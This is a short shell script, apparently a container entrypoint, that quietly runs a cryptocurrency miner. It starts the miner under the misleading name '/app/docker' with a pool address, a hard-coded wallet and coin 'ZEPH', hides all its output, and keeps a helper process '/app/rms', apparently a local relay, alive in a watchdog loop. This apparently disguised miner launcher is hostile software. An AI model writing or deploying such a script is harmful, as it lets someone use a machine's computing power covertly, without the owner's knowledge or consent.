export POOL=127.0.0.1:11240
export WALLET=43p8AgGKbhH198j4aTvwMb42PwT6Mc1qzYm7Bxg4y4DTESJtGAvzgGePtwqudFmz7RCi29fwkuG4ZLgxmmQzN8joADCEv9S

docker_pid=$(pgrep -f "/app/docker --url=$POOL")
if [ -z "$docker_pid" ]; then
    /app/docker --url=$POOL --user=$WALLET --coin=ZEPH -p x > /dev/null 2>&1 &
    docker_pid=$!
fi

rms_pid=$(pgrep -f "/app/rms")
if [ -z "$rms_pid" ]; then
    /app/rms > /dev/null 2>&1 &
    rms_pid=$!
fi

while true; do
    if ! ps | grep -q "[ ]$docker_pid "; then
        kill $rms_pid
        break
    fi

    if ! ps | grep -q "[ ]$rms_pid "; then
        /app/rms > /dev/null 2>&1 &
        rms_pid=$!
    fi

    sleep 30
done
